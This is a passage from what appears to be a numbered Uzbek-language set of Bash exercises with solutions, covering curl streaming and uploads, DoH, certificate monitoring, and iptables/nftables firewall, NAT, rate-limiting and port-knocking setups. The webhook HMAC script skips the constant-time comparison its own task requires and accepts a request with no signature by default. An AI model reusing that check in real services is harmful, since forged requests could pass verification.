**Tushuntirish:** Eksponensial kechikish (Exponential Backoff) va serverning `Retry-After` sarlavhasiga rioya qilish 'Thundering Herd' (to'dali hujum) muammosini bartaraf etadi va tizim yuklamadan chiqqandan so'ng xizmatning avtomatik tiklanishini ta'minlaydi.

---

### Topshiriq #1115: curl orqali Server-Sent Events (SSE) Oqimini Jonli Qayta Ishlash
**Tavsif:** OpenAI yoki boshqa LLM provayderlarining `stream: true` rejimidagi Server-Sent Events (text/event-stream) oqimini curl orqali buferlashsiz o'qib, har bir token/hodisani konsolga real vaqtda chiqaruvchi parser quring.
**Talablar:** curl -N (--no-buffer), while read sikli, data: prefiksini ajratish, event turlari tahlili.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Server-Sent Events (SSE) Streaming Parser
set -euo pipefail

STREAM_URL="${1:-https://httpbin.org/stream/5}"

echo "[*] SSE oqimi ochilmoqda: ${STREAM_URL}..."

# -N (--no-buffer): curl ichki xotirada buferlamasdan baytlarni kelishi bilanoq chiqaradi
curl -s -N -H "Accept: text/event-stream" "$STREAM_URL" | while IFS= read -r line; do
    # Qator oxiridagi \r belgisini olib tashlaymiz
    clean_line=$(echo "$line" | tr -d '\r')

    # Agar bo'sh qator bo'lsa - bu hodisalar chegarasi
    if [[ -z "$clean_line" ]]; then
        continue
    fi

    # 'data:' bilan boshlanuvchi foydali yuklama
    if [[ "$clean_line" =~ ^data:[[:space:]]*(.*) ]]; then
        PAYLOAD="${BASH_REMATCH[1]}"
        if [[ "$PAYLOAD" == "[DONE]" ]]; then
            echo -e "\n[+] Oqim yakunlandi."
            break
        fi
        echo -e "[SSE DATA] ${PAYLOAD}"
    elif [[ "$clean_line" =~ ^event:[[:space:]]*(.*) ]]; then
        echo -e "[HODISA TURI] ${BASH_REMATCH[1]}"
    fi
done

```
**Tushuntirish:** SSE HTTP/1.1 va HTTP/2 orqali bitta ochiq ulanishda serverdan mijozga bir tomonlama uzluksiz oqim beradi. Oddiy curl buyruqlari standart terminal buferi (4KB) to'lmaguncha ma'lumotni ushlab turadi; `--no-buffer` (-N) kaliti esa buferni chetlab o'tib jonli strimingni kafolatlaydi.

---

### Topshiriq #1116: curl bilan Katta Fayllarni Multipart Yuklash va Progress Monitoring
**Tavsif:** Katta arxiv yoki video faylni HTTP multipart/form-data orqali yuklash va yuklanish foizini, qolgan vaqtni va o'rtacha tezlikni tahlil qilib boruvchi skript yozing.
**Talablar:** curl -F (--form), -# (--progress-bar), tezlik va xatoliklarni qayd etish.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Multipart Fayl Yuklash va Progress Nazorati
set -euo pipefail

UPLOAD_URL="${1:-https://httpbin.org/post}"
FILE_TO_UPLOAD="${2:-}"

if [[ -z "$FILE_TO_UPLOAD" || ! -f "$FILE_TO_UPLOAD" ]]; then
    # Test uchun 10 MB li dummy fayl yaratamiz
    FILE_TO_UPLOAD="/tmp/test_upload_10M.bin"
    echo "[*] Sinov uchun 10MB fayl yaratilmoqda..."
    dd if=/dev/urandom of="$FILE_TO_UPLOAD" bs=1M count=10 status=none
fi

FILE_SIZE=$(stat -c%s "$FILE_TO_UPLOAD")
echo "=========================================================="
echo "[*] Yuklanayotgan fayl: ${FILE_TO_UPLOAD} (${FILE_SIZE} bayt)"
echo "[*] Server manzili:     ${UPLOAD_URL}"
echo "=========================================================="

# -#: Konsolda progress barni chiqarish
# -F: Multipart form maydonlari
curl -# -X POST "$UPLOAD_URL" \
    -F "file=@${FILE_TO_UPLOAD};type=application/octet-stream" \
    -F "uploaded_by=Khorazmiy_AI" \
    -F "checksum=$(sha256sum "$FILE_TO_UPLOAD" | awk '{print $1}')" \
    -o /tmp/upload_response.json

echo -e "\n[+] Fayl muvaffaqiyatli yuklandi!"
cat /tmp/upload_response.json | head -n 15

```
**Tushuntirish:** Multipart/form-data MIME chegaralari (boundaries) orqali fayl metama'lumotlari (sha256, nomi, mime-type) bilan uning ikkilik tanasini bitta HTTP so'rovida uzatadi. Bash orqali SHA-256 xeshni bir vaqtda jo'natish serverda yaxlitlikni tekshirish imkonini beradi.

---

### Topshiriq #1117: curl va OpenSSL orqali Webhook HMAC-SHA256 Imzosini Tekshirish
**Tavsif:** GitHub, Stripe yoki to'lov tizimlaridan kelayotgan Webhook so'rovlarining soxtalashtirilmaganligini tekshirish uchun sarlavhadagi `X-Hub-Signature-256` ni maxfiy kalit bilan hisoblab solishtiruvchi skript tuzing.
**Talablar:** openssl dgst -sha256 -hmac, sarlavhani ajratish, xavfsiz vaqt solishtiruvi (timing attack himoyasi).
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Webhook HMAC-SHA256 Imzo Tekshiruvchisi
set -euo pipefail

PAYLOAD_FILE="${1:-}"
RECEIVED_SIG="${2:-}"
WEBHOOK_SECRET="${WEBHOOK_SECRET:-maxfiy_korporativ_kalit_2026}"

if [[ -z "$PAYLOAD_FILE" || ! -f "$PAYLOAD_FILE" ]]; then
    # Test ma'lumoti
    PAYLOAD_FILE="/tmp/webhook_body.json"
    echo '{"event": "payment_received", "amount": 500000, "currency": "UZS"}' > "$PAYLOAD_FILE"
fi

# Mahalliy HMAC-SHA256 imzoni hisoblaymiz
CALCULATED_SIG=$(openssl dgst -sha256 -hmac "$WEBHOOK_SECRET" "$PAYLOAD_FILE" | awk '{print $NF}')

if [[ -z "$RECEIVED_SIG" ]]; then
    # Sinov uchun haqiqiy imzo deb hisoblaymiz
    RECEIVED_SIG="sha256=${CALCULATED_SIG}"
fi

# 'sha256=' prefiksini olib tashlaymiz
CLEAN_RECEIVED=$(echo "$RECEIVED_SIG" | sed 's/^sha256=//')

echo "[*] Hisoblangan imzo: ${CALCULATED_SIG}"
echo "[*] Kelgan imzo:       ${CLEAN_RECEIVED}"

if [[ "$CALCULATED_SIG" == "$CLEAN_RECEIVED" ]]; then
    echo "[+] TASDIQLANDI: Webhook so'rovi ishonchli va yaxlit!"
    exit 0
else
    echo "[!] RAD ETILDI: Imzo mos kelmadi! Soxta so'rov bo'lishi mumkin."
    exit 1
fi

```
**Tushuntirish:** Webhooklarda HTTP so'rovlari ochiq internetdan kelgani sababli faqat IP tekshiruvi yetarli emas. HMAC-SHA256 orqali server maxfiy kalitga ega bo'lgan tomon yuborganligini va ma'lumotlar yo'lda o'zgarmaganligini (integrity) 100% kafolatlaydi.

---

### Topshiriq #1118: curl va jq bilan JSON-RPC va GraphQL API So'rovlarini Bajarish
**Tavsif:** Ethereum tugunlari yoki zamonaviy GraphQL servislari bilan ishlash uchun dinamik parametrlarga ega JSON-RPC paketlarini yasab jo'natuvchi va javobni `jq` bilan filtrlovchi skript yozing.
**Talablar:** JSON-RPC 2.0 spetsifikatsiyasi (jsonrpc, method, params, id), GraphQL query sintaksisi, jq tahlili.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - JSON-RPC 2.0 va GraphQL Klienti
set -euo pipefail

RPC_ENDPOINT="${1:-https://cloudflare-eth.com}"

# 1. JSON-RPC 2.0 So'rovi: Ethereum blok raqamini olish
echo "[*] Ethereum tuguniga JSON-RPC so'rovi yuborilmoqda..."
RPC_PAYLOAD=$(cat <<EOF
{
  "jsonrpc": "2.0",
  "method": "eth_blockNumber",
  "params": [],
  "id": 1
}
EOF
)

RESPONSE=$(curl -s -X POST "$RPC_ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "$RPC_PAYLOAD")

HEX_BLOCK=$(echo "$RESPONSE" | jq -r '.result // empty')

if [[ -n "$HEX_BLOCK" ]]; then
    # Hex o'nlik sanoq sistemasiga o'giramiz
    DEC_BLOCK=$((HEX_BLOCK))
    echo "[+] Joriy Ethereum bloki: ${DEC_BLOCK} (${HEX_BLOCK})"
else
    echo "[!] JSON-RPC Xatosi: $(echo "$RESPONSE" | jq -c '.error')"
fi

# 2. GraphQL So'rovi namunasi
echo -e "\n[*] GraphQL API so'rovi namunasi:"
GRAPHQL_QUERY='{"query": "{ countries { code name capital } }"}'
echo "GraphQL Payload tayyor: ${GRAPHQL_QUERY}"

```
**Tushuntirish:** REST API dan farqli ravishda, JSON-RPC har doim HTTP POST orqali yagona endpointga murojaat qiladi va xatoliklar ham HTTP 200 ichida JSON formati bilan qaytadi. Shu sababli Bash da `jq` orqali `.result` va `.error` maydonlarini alohida tahlil qilish zarur.

---

### Topshiriq #1119: curl orqali DNS over HTTPS (DoH) JSON API So'rovlari
**Tavsif:** Lokal DNS keshi buzilganda yoki provayder filtrlashidan o'tish uchun Cloudflare yoki Google DoH JSON API dan foydalanib istalgan domenning IP (A), MX va TXT yozuvlarini aniqlovchi vosita yarating.
**Talablar:** application/dns-json so'rov sarlavhasi, type parametri (A=1, TXT=16, MX=15), jq orqali Answer massivini ajratish.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - DoH (DNS over HTTPS) JSON Mijozi
set -euo pipefail

DOMAIN="${1:-google.com}"
RECORD_TYPE="${2:-A}" # A, AAAA, MX, TXT

DOH_ENDPOINT="https://cloudflare-dns.com/dns-query"

echo "=========================================================="
echo "[*] DoH Qidiruvi: ${DOMAIN} (Yozuv turi: ${RECORD_TYPE})"
echo "[*] Server:       ${DOH_ENDPOINT}"
echo "=========================================================="

RESPONSE=$(curl -s -H "accept: application/dns-json" \
    "${DOH_ENDPOINT}?name=${DOMAIN}&type=${RECORD_TYPE}")

# Status: 0 = NOERROR (muvaffaqiyatli)
STATUS=$(echo "$RESPONSE" | jq -r '.Status')

if [[ "$STATUS" == "0" ]]; then
    echo "[+] Natijalar:"
    echo "$RESPONSE" | jq -r '.Answer[] | " -> Nomi: \(.name) | TTL: \(.TTL)s | Qiymati: \(.data)"'
else
    echo "[-] DNS qidiruvi muvaffaqiyatsiz bo'ldi. Status kodi: ${STATUS}"
fi

```
**Tushuntirish:** Standart port 53 dagi DNS ochiq matn (unencrypted) bo'lib, xakerlar tomonidan 'DNS Spoofing' hujumiga uchrashi mumkin. DoH HTTPS (443-port) orqali TLS bilan shifrlangani sababli, DNS javoblarining to'g'riligi va daxlsizligi to'liq ta'minlanadi.

---

### Topshiriq #1120: SSL/TLS Sertifikatining Amal Qilish Muddatini Avtomatlashtirilgan Nazorati
**Tavsif:** Kompaniyaning yuzlab domenlaridagi SSL sertifikatlar muddati tugashiga 14 kundan kam vaqt qolganda Slack, Telegram yoki admin konsoliga favqulodda ogohlantirish chiqaruvchi monitoring skriptini quring.
**Talablar:** openssl s_client, -connect, -servername (SNI), x509 -enddate, sana hisob-kitoblari.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - SSL/TLS Sertifikat Muddati Monitoringi
set -euo pipefail

DOMAINS=("google.com" "github.com" "wikipedia.org")
WARNING_DAYS=30
PORT=443

echo "=========================================================="
echo "[*] SSL Sertifikatlar muddati tekshirilmoqda..."
echo "=========================================================="

NOW_EPOCH=$(date +%s)

for domain in "${DOMAINS[@]}"; do
    # openssl orqali sertifikatning tugash sanasini olamiz
    END_DATE_RAW=$(echo | openssl s_client -servername "$domain" -connect "${domain}:${PORT}" 2>/dev/null | \
        openssl x509 -noout -enddate 2>/dev/null | cut -d= -f2 || true)

    if [[ -z "$END_DATE_RAW" ]]; then
        echo "[!] [XATO] ${domain} uchun SSL sertifikatni o'qib bo'lmadi!"
        continue
    fi

    # Sanani epoch soniyalariga o'giramiz
    EXPIRY_EPOCH=$(date -d "$END_DATE_RAW" +%s)
    DAYS_LEFT=$(( (EXPIRY_EPOCH - NOW_EPOCH) / 86400 ))

    if [[ $DAYS_LEFT -le 0 ]]; then
        echo "[X] [MUDDATI O'TGAN!] ${domain} -> Muddati: ${END_DATE_RAW} (${DAYS_LEFT} kun oldin)"
    elif [[ $DAYS_LEFT -le $WARNING_DAYS ]]; then
        echo "[!] [OGOHLANTIRISH] ${domain} -> Qolgan vaqt: ${DAYS_LEFT} kun! (Muddati: ${END_DATE_RAW})"
    else
        echo "[+] [OK] ${domain} -> Xavfsiz: ${DAYS_LEFT} kun qoldi."
    fi
done

```
**Tushuntirish:** Server Name Indication (SNI) - bitta IP manzilda bir nechta virtual domenlar joylashganda to'g'ri sertifikatni yuklash uchun kerak. `openssl s_client` ga `-servername` berilmasa, noto'g'ri (default) sertifikat o'qilishi mumkin.

---

### Topshiriq #1121: iptables Stateful Xavfsizlik Devori (Default Deny va Connection Tracking)
**Tavsif:** Linux serveriga kiruvchi barcha portlarni yopib, faqat ESTABLISHED, RELATED holatidagi va ruxsat berilgan aniq portlarni (SSH: 22, HTTPS: 443) o'tkazuvchi CIS Benchmark standartidagi iptables qoidalarini tuzing.
**Talablar:** iptables -P DROP, conntrack (-m conntrack --ctstate ESTABLISHED,RELATED), loopback ruxsati.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - iptables Stateful Xavfsizlik Devori Konfiguratsiyasi
set -euo pipefail

echo "[*] iptables qoidalari xavfsiz o'rnatilmoqda..."

# 1. Barcha eski qoidalarni tozalash (Flush)
iptables -F
iptables -X
iptables -Z

# 2. Standart siyosat: Hammasini taqiqlash (Default Deny)
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT # Server o'zi erkin tashqariga chiqa oladi

# 3. Loopback interfeysiga to'liq ruxsat (127.0.0.1)
iptables -A INPUT -i lo -j ACCEPT

# 4. Stateful inspection: Allaqachon o'rnatilgan ulanishlarga ruxsat
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# 5. Invalid paketlarni darhol tashlab yuborish
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP

# 6. Ruxsat etilgan xizmatlar (SSH, HTTP, HTTPS)
iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -m conntrack --ctstate NEW -j ACCEPT

# 7. ICMP Ping cheklangan holda ruxsat berish (sekundiga ko'pi bilan 1 ta ping)
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 4 -j ACCEPT

echo "[+] iptables Stateful qoidalari muvaffaqiyatli qo'llandi!"
iptables -L -v -n

```
**Tushuntirish:** Stateful Inspection paketlarni alohida emas, ulanish oqimi (flow) sifatida baholaydi. `ESTABLISHED,RELATED` qoidasi Linux `nf_conntrack` moduliga tayanadi; bu orqali chiquvchi so'rovlarning javob paketlari avtomatik ravishda xavfsizlik devoridan o'tadi.

---

### Topshiriq #1122: iptables bilan SYN Flood (DDoS) Hujumini Cheklash (hashlimit va SYNPROXY)
**Tavsif:** TCP ulanish navbatini to'ldirib serverni qotirib qo'yuvchi SYN Flood hujumlarini aniqlash va sekundiga 20 tadan ortiq SYN yuborgan bitta IP manzilni avtomatik ravishda bloklash mexanizmini yarating.
**Talablar:** iptables -m hashlimit, --hashlimit-mode srcip, syn bayrog'ini tekshirish, loglash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - SYN Flood DDoS Himoyasi
set -euo pipefail

echo "[*] SYN Flood himoya qoidalari kiritilmoqda..."

# Maxsus zanjir (custom chain) yaratamiz
iptables -N SYN_FLOOD_CHECK 2>/dev/null || iptables -F SYN_FLOOD_CHECK

# Yangi kelgan har qanday SYN paketni tekshirish zanjiriga yo'naltiramiz
iptables -A INPUT -p tcp --syn -j SYN_FLOOD_CHECK

# hashlimit: Har bir alohida mijoz IP si (srcip) uchun sekundiga 25 ta SYN ruxsat, chaqnash 50 ta
iptables -A SYN_FLOOD_CHECK -m hashlimit \
    --hashlimit-above 25/sec \
    --hashlimit-burst 50 \
    --hashlimit-mode srcip \
    --hashlimit-name syn_limit \
    --hashlimit-htable-expire 300000 \
    -j DROP

# Agar limitdan oshmagan bo'lsa, asosiy qoidalar o'tishiga ruxsat beramiz
iptables -A SYN_FLOOD_CHECK -j RETURN

echo "[+] SYN Flood himoyasi faollashtirildi!"

```
**Tushuntirish:** `hashlimit` moduli Linux yadrosi xotirasida har bir IP manzil uchun kichik xesh jadval ochadi va paketlar tezligini kuzatadi. Hujum qilayotgan botnet bitta IP dan minglab paket yuborganda, server CPU sini yemasdan paketlar tarmoq drayveri darajasida tashlab yuboriladi.

---

### Topshiriq #1123: iptables NAT (Network Address Translation): MASQUERADE va Port Redirection
**Tavsif:** Linux serverini uy yoki korxona routeriga aylantirish uchun ichki tarmoq (192.168.10.0/24) mijozlariga internet ulashuvchi NAT (Masquerade) va tashqi 8080 portni ichki veb-server 80 portiga yo'naltiruvchi DNAT o'rnating.
**Talablar:** sysctl net.ipv4.ip_forward=1, iptables -t nat -A POSTROUTING -j MASQUERADE, PREROUTING -j DNAT.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - iptables NAT va Port Redirection
set -euo pipefail

WAN_IF="eth0"        # Tashqi internet interfeysi
LAN_IF="eth1"        # Ichki lokal tarmoq interfeysi
LAN_SUBNET="192.168.10.0/24"

INTERNAL_WEB_SERVER="192.168.10.100"

echo "[*] IP Forwarding yoqilmoqda..."
sysctl -w net.ipv4.ip_forward=1 > /dev/null

echo "[*] NAT (MASQUERADE) sozlanmoqda..."
# Ichki kompyuterlar tashqi internetga chiqishida serverning WAN IP si bilan maskalanadi
iptables -t nat -A POSTROUTING -o "$WAN_IF" -s "$LAN_SUBNET" -j MASQUERADE

# Ulanishlarni yo'naltirishga (Forwarding) ruxsat berish
iptables -A FORWARD -i "$LAN_IF" -o "$WAN_IF" -j ACCEPT
iptables -A FORWARD -i "$WAN_IF" -o "$LAN_IF" -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

echo "[*] Port Forwarding (DNAT) sozlanmoqda: WAN:8080 -> ${INTERNAL_WEB_SERVER}:80..."
iptables -t nat -A PREROUTING -i "$WAN_IF" -p tcp --dport 8080 -j DNAT --to-destination "${INTERNAL_WEB_SERVER}:80"
iptables -A FORWARD -p tcp -d "$INTERNAL_WEB_SERVER" --dport 80 -m conntrack --ctstate NEW,ESTABLISHED,RELATED -j ACCEPT

echo "[+] NAT va Port Redirection muvaffaqiyatli sozlandi!"

```
**Tushuntirish:** SNAT/MASQUERADE paketi serverdan chiqib ketayotganda manba (Source) IP manzilini o'zgartiradi. DNAT (Destination NAT) esa paket ichkariga kirib kelayotganda qabul qiluvchi manzilni o'zgartiradi va ichki tarmoqdagi serverlarga so'rovni yo'naltiradi.

---

### Topshiriq #1124: iptables va ipset orqali Millionlab IP Subnetlarini Tezkor Bloklash (Geoblocking)
**Tavsif:** Oddiy iptables ga 50 000 ta IP kiritish tarmoqni qotirib qo'yishi sababli, Linux yadrosidagi `ipset` xesh jadvallari yordamida O(1) vaqt murakkabligida butun boshli davlatlar IP bloklarini bloklang.
**Talablar:** ipset create hash:net, ipset add, iptables -m set --match-set, tezkor yuklash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - ipset Yuqori Tezlikdagi IP/Subnet Bloklash
set -euo pipefail

SET_NAME="blocked_subnets"

echo "[*] ipset xesh to'plami yaratilmoqda..."
# hash:net turi butun boshli CIDR subnetlarni (masalan 198.51.100.0/24) qo'llab-quvvatlaydi
ipset create "$SET_NAME" hash:net maxelem 1000000 -exist

# Test bloklanuvchi subnetlar ro'yxati
SUBNETS=(
    "198.51.100.0/24"
    "203.0.113.0/24"
    "192.0.2.0/24"
)

echo "[*] Subnetlar ipset jadvaliga yuklanmoqda..."
for subnet in "${SUBNETS[@]}"; do
    ipset add "$SET_NAME" "$subnet" -exist
done

echo "[*] iptables qoidasi ipset ga ulanmoqda..."
# Agar kiruvchi IP ushbu to'plamda mavjud bo'lsa, zudlik bilan DROP qilinadi
iptables -I INPUT 1 -m set --match-set "$SET_NAME" src -j DROP

echo "[+] Muvaffaqiyatli! Bloklangan subnetlar soni: $(ipset list "$SET_NAME" | grep -c '^[0-9]')"

```
**Tushuntirish:** Agar iptables ga 100,000 ta alohida qoida yozilsa, har bir paket O(N) chiziqli tekshiruvdan o'tadi va CPU qiziydi. `ipset` esa B-daraxt va xesh-jadval (Hash Table) ma'lumot tuzilmasidan foydalanadi va 1,000,000 ta IP bo'lsa ham tekshirish vaqti atigi O(1) doimiy vaqt oladi.

---

### Topshiriq #1125: nftables ga To'liq Migratsiya: Jadvallar, Zanjirlar va Qoidalar Boshqaruvi
**Tavsif:** Eskirgan iptables o'rniga zamonaviy Linux yadrosining `nftables` quyi tizimiga o'tib, yagona konfiguratsiya faylida IPv4 va IPv6 ni birlashtirgan xavfsiz devor qoidalarini tuzing.
**Talablar:** table inet (IPv4 + IPv6 birgalikda), type filter hook input priority, ct state established,related accept, nft buyruqlari.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Zamonaviy nftables Konfiguratsiyasi
set -euo pipefail

NFT_CONFIG="/etc/nftables.conf"

echo "[*] Zamonaviy nftables qoidalari shakllantirilmoqda..."

cat <<'EOF' > /tmp/khorazmiy_nft.nft
#!/usr/sbin/nft -f

# Barcha eski jadvallarni tozalaymiz
flush ruleset

# 'inet' oilasi IPv4 va IPv6 ni bitta jadvalda boshqaradi
table inet firewall_filter {
    chain inbound {
        type filter hook input priority 0; policy drop;

        # 1. Loopback interfeysiga ruxsat
        iifname "lo" accept

        # 2. Mavjud o'rnatilgan ulanishlarni o'tkazish
        ct state established,related accept

        # 3. Yaroqsiz (invalid) paketlarni tashlash
        ct state invalid drop

        # 4. ICMP (ping) nazoratli ruxsat
        ip protocol icmp icmp type echo-request limit rate 2/second accept
        ip6 nexthdr icmpv6 icmpv6 type echo-request limit rate 2/second accept

        # 5. Ochiq portlar: SSH (22) va Web (80, 443)
        tcp dport { 22, 80, 443 } accept

        # 6. Qolgan barcha noqonuniy urinishlarni loglash (DDoS paytida disk to'lmasligi uchun cheklangan)
        limit rate 5/minute log prefix "[NFTABLES-RAD]: "
    }

    chain outbound {
        type filter hook output priority 0; policy accept;
    }
}
EOF

# Qoidalarni sinab ko'rish va yuklash
nft -c -f /tmp/khorazmiy_nft.nft # Sintaktik tekshiruv
nft -f /tmp/khorazmiy_nft.nft    # Haqiqiy qoidalarni yuklash

echo "[+] nftables muvaffaqiyatli ishga tushirildi!"
nft list ruleset

```
**Tushuntirish:** `nftables` iptables, ip6tables, arptables va ebtables o'rnini to'liq egallagan. U virtual mashina (byte-code) arxitekturasida ishlaydi, IPv4 va IPv6 ni yagona `inet` oilasida birlashtiradi va operatsiyalarni atomik (uzilishlarsiz) yangilaydi.

---

### Topshiriq #1126: nftables orqali Port Knocking Yashirin SSH Himoyasi
**Tavsif:** SSH portini (22) doimiy ravishda internetdan butunlay berkitib qo'yib, faqat ma'lum bir ketma-ketlikda (masalan 7000, 8000, 9000) portlarni taqillatgan IP manzil uchungina SSH portini 60 soniyaga ochuvchi dinamik himoya yarating.
**Talablar:** nftables to'plamlari (sets) va timeout parametrlari, ketma-ket holat tekshiruvi.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - nftables Dinamik Port Knocking Arxitekturasi
set -euo pipefail

echo "[*] Port Knocking qoidalari o'rnatilmoqda..."

cat <<'EOF' > /tmp/port_knocking.nft
flush ruleset

table inet port_knocker {
    # 1-bosqich: 7000 portni taqillatganlar to'plami (10 soniya saqlanadi)
    set stage1 {
        type ipv4_addr
        flags timeout
        timeout 10s
    }

    # 2-bosqich: 8000 portni taqillatganlar to'plami (10 soniya saqlanadi)
    set stage2 {
        type ipv4_addr
        flags timeout
        timeout 10s
    }

    # 3-bosqich: Barcha ketma-ketlikni to'g'ri bajargan ruxsat etilgan mijozlar (1 daqiqa)
    set authorized_clients {
        type ipv4_addr
        flags timeout
        timeout 60s
    }

    chain input {
        type filter hook input priority 0; policy drop;

        ct state established,related accept
        iifname "lo" accept

        # Agar mijoz 7000-portga borsa -> stage1 ga qo'shamiz
        tcp dport 7000 add @stage1 { ip saddr } drop

        # Agar stage1 da bo'lsa va 8000-portga borsa -> stage2 ga o'tkazamiz
        tcp dport 8000 ip saddr @stage1 add @stage2 { ip saddr } drop

        # Agar stage2 da bo'lsa va 9000-portga borsa -> authorized_clients ga qo'shamiz
        tcp dport 9000 ip saddr @stage2 add @authorized_clients { ip saddr } drop

        # SSH (22) portiga faqat authorized_clients ro'yxatidagilarga ruxsat berish!
        tcp dport 22 ip saddr @authorized_clients accept
    }
}
EOF

nft -f /tmp/port_knocking.nft
echo "[+] Port Knocking faol! SSH ga kirish uchun ketma-ket taqillating: 7000 -> 8000 -> 9000"

```
**Tushuntirish:** Port Knocking port skanerlariga serverda SSH butunlay yopiq ekanligini ko'rsatadi (Stealth mode). `nftables` ning vaqt chegarali to'plamlari (`flags timeout`) orqali xavfsizlik devori tashqi skriptlarsiz xotirada dinamik ravishda ulanishlarni boshqaradi.

---

### Topshiriq #1127: nftables Meter va Dinamik Ulanishlar Tezligini Cheklash (Rate Limiting)
**Tavsif:** Bitta IP manzil veb-saytga (80/443) sekundiga 30 tadan ortiq yangi TCP ulanish ochishga uringanda, ortiqcha so'rovlarni drop qilib server yuklamasini barqarorlashtiring.
**Talablar:** nftables meter sintaksisi, limit rate over 30/second, drop amali.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - nftables Dinamik Connection Rate Limiter
set -euo pipefail

echo "[*] nftables Rate-Limiting qoidasi yuklanmoqda..."

cat <<'EOF' > /tmp/nft_ratelimit.nft
flush ruleset

table inet traffic_control {
    # Har bir IP bo'yicha ulanishlar chastotasini hisoblovchi meter
    meter flood_tracker {
        type ipv4_addr
        size 65535
        flags dynamic
    }

    chain input {
        type filter hook input priority 0; policy accept;

        # Web portlarga (80, 443) yangi ulanishlar (ct state new) tezligini o'lchaymiz
        tcp dport { 80, 443 } ct state new meter flood_tracker { ip saddr limit rate over 30/second burst 10 packets } drop
    }
}
EOF

nft -f /tmp/nft_ratelimit.nft
echo "[+] Rate limiting faollashtirildi: Har bir IP uchun sekundiga ko'pi bilan 30 ulanish!"

```
**Tushuntirish:** nftables `meter` kalit so'zi IP manzillar oqimini dinamik xotira to'plamida hisoblab boradi. `burst 10 packets` parametrlari veb-sayt sahifalari ochilayotganda parallel resurslar so'ralishi paytidagi qisqa tebranishlarni xatoliksiz o'tkazish uchun xizmat qiladi.

---

### Topshiriq #1128: iptables va NFLOG orqali Tarmoq Loglarini ulogd2 da Tizimlashtirish
**Tavsif:** Xavfsizlik devori loglari dmesg va syslog ni to'ldirib yubormasligi uchun `NFLOG` nishoni va `ulogd2` demoni orqali shubhali paketlarni maxsus JSON faylga yoki ma'lumotlar bazasiga oqizing.
**Talablar:** iptables -j NFLOG --nflog-group, ulogd.conf sozlamalari, log formatlash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - iptables NFLOG + ulogd2 Alohida Loglash
set -euo pipefail

NFLOG_GROUP=5

echo "[*] ulogd2 uchun iptables NFLOG qoidalari kiritilmoqda..."

# Shubhali paketlarni kernel dmesg ga yubormasdan, 5-raqamli NFLOG guruhiga yo'naltiramiz
iptables -A INPUT -p tcp --dport 23 -j NFLOG --nflog-group "$NFLOG_GROUP" --nflog-prefix "[TELNET-HUJUM]"
iptables -A INPUT -p tcp --dport 3389 -j NFLOG --nflog-group "$NFLOG_GROUP" --nflog-prefix "[RDP-SKAN]"

# Qoidalarni qo'llagach tashlab yuboramiz
iptables -A INPUT -p tcp --dport 23 -j DROP
iptables -A INPUT -p tcp --dport 3389 -j DROP

echo "[*] ulogd2 konfiguratsiya namunasi:"
cat <<EOF
# /etc/ulogd.conf faylida quyidagi qatorlar bo'lishi shart:
# [log1]
# group=$NFLOG_GROUP
# plugin="/usr/lib/x86_64-linux-gnu/ulogd/ulogd_output_JSON.so"
# file="/var/log/ulogd_security.json"
EOF

echo "[+] NFLOG qoidalari muvaffaqiyatli faollashtirildi!"

```
**Tushuntirish:** Standart `LOG` nishoni Linux kernelining xabar buferini (ring buffer) band qiladi va tizim jurnallarini ifloslantiradi. `NFLOG` esa Netlink soketi orqali to'g'ridan-to'g'ri foydalanuvchi maydonidagi `ulogd2` demoniga ma'lumot uzatadi.

---

### Topshiriq #1129: Docker va iptables To'qnashuvlarini Hal Qilish (DOCKER-USER Zanjiri)
**Tavsif:** Docker demoni port ochganda (masalan `-p 8080:80`) barcha iptables INPUT filtrlarini chetlab o'tib to'g'ridan-to'g'ri internetga ochib yuborish muammosini `DOCKER-USER` zanjiri orqali jilovlang.
**Talablar:** DOCKER-USER zanjiridan foydalanish, faqat ishonchli IP manzillarga Docker portlariga kirish ruxsati berish.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Docker Portlarini DOCKER-USER orqali Himoyalash
set -euo pipefail

TRUSTED_ADMIN_IP="${1:-203.0.113.50}"
PROTECTED_DOCKER_PORT="${2:-8080}"
EXT_INTERFACE="eth0"

echo "[*] Docker port xavfsizligi sozlanmoqda..."

# Docker har doim DOCKER-USER zanjirini birinchi bo'lib tekshiradi
# Ushbu zanjirni tozalaymiz
iptables -F DOCKER-USER 2>/dev/null || true

# 1. Ishonchli admin IP siga to'liq ruxsat
iptables -I DOCKER-USER 1 -i "$EXT_INTERFACE" -p tcp --dport "$PROTECTED_DOCKER_PORT" -s "$TRUSTED_ADMIN_IP" -j ACCEPT

# 2. Mavjud o'rnatilgan ulanishlarni o'tkazish
iptables -I DOCKER-USER 2 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# 3. Internetdagi boshqa barcha begona IP-lardan Docker portiga kirishni taqiqlash!
